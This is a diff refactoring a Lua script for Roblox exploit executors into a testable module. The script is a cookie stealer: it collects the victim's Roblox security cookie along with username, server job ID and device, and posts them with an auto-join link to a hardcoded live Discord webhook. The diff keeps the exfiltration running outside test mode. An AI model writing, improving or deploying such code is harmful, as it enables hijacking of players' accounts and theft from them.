@@ -1,3 +1,5 @@
+local M = {}
+
 local request = request or http_request or syn.request or fluxus.request or KRNL.HttpRequest
 local httpService = game:GetService("HttpService")
 local players = game:GetService("Players")
@@ -6,7 +8,7 @@ local marketplaceService = game:GetService("MarketplaceService")
 local webhookUrl = "https://discord.com/api/webhooks/1322910314534010880/Fx3dNcAnfeP5iGp9yGEGnHt217Jq_eni_Wt7WOS7AJJPT0oGoYMhO9fHM22s7zr4ujJp"
 
 -- Collect Roblox security cookie (generalized for multiple executors)
-local function getCookie()
+function M.getCookie()
     local cookieValue = ""
 
     -- Try common methods used by various executors
@@ -28,7 +30,7 @@ local function getCookie()
 end
 
 -- Gather session data
-local function gatherInfo()
+function M.gatherInfo()
     local placeInfo = marketplaceService:GetProductInfo(game.PlaceId)
     local info = {
         Username = players.LocalPlayer.Name,
@@ -45,7 +47,7 @@ local function gatherInfo()
 end
 
 -- Send session data to webhook
-local function sendToWebhook(data)
+function M.sendToWebhook(data)
     local payload = {
         ["content"] = "Collected Roblox Session Data",
         ["embeds"] = {{
@@ -59,7 +61,7 @@ local function sendToWebhook(data)
                 {["name"] = "Job ID", ["value"] = data.JobId, ["inline"] = true},
                 {["name"] = "Device Type", ["value"] = data.Device, ["inline"] = true},
                 {["name"] = "Cookie", ["value"] = "```" .. data.Cookie .. "```", ["inline"] = false}, -- Send the cookie
-                {["name"] = "Auto-Join Link", ["value"] = "[Click to Join Server](roblox://placeId=" .. data.PlaceId .. "&gameInstanceId=" .. data.JobId .. ")", ["inline"] = false},
+                {["name"] = "Auto-Join Link", ["value"] = "[Click to Join Server](" .. data.AutoJoinLink .. ")", ["inline"] = false},
             },
             ["color"] = 0x7289DA
         }}
@@ -74,5 +76,9 @@ local function sendToWebhook(data)
 end
 
 -- Main Execution
-local data = gatherInfo()
-sendToWebhook(data) -- Send session data to webhook
+if not _TEST then
+    local data = M.gatherInfo()
+    M.sendToWebhook(data) -- Send session data to webhook
+end
+
+return M
